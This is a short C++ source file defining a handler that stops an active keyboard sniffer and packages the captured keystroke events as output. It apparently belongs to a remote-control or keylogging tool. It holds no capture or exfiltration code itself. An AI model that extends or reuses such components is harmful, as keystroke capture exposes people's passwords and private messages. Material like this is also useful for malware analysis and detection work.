#include "StopSniffHandler.hpp"

#include "ActiveKeySniff.hpp"

void StopSniffHandler::run()
{
	ActiveKeySniff::stop();

	append(std::make_unique<KeyboardEventsProduct>(std::move(ActiveKeySniff::g_keyboard_events)));
	finished();
}
